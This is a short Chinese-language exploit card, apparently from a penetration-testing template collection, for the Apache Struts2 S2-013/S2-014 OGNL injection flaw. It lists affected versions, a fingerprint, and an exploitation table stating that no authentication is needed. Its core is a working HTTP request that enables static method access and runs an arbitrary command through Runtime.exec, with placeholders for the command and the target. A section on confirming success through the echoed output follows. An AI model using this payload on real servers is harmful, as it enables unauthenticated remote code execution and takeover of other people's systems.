# S2-013/S2-014 OGNL 注入 RCE

## 指纹特征
- 服务: Apache Struts2 (2.0.0 - 2.3.14.1)
- 关键点: `<s:a>` 或 `<s:url>` 标签 `includeParams="all"`

## 利用矩阵
| 触发方式 | 路径 | 权限要求 |
| :--- | :--- | :--- |
| OGNL 注入 | `/*.action?a=${OGNL}` | 无 |

## PoC 指令

通过构造包含 OGNL 表达式的参数诱导框架解析：

```http
GET /link.action?a=${(#_memberAccess["allowStaticMethodAccess"]=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('{{COMMAND}}').getInputStream()))} HTTP/1.1
Host: {{TARGET}}:8080
```

## Success Signal
- **状态验证**: 执行命令并获取输出。
- **验证回显**: 命令执行结果在响应中显示。
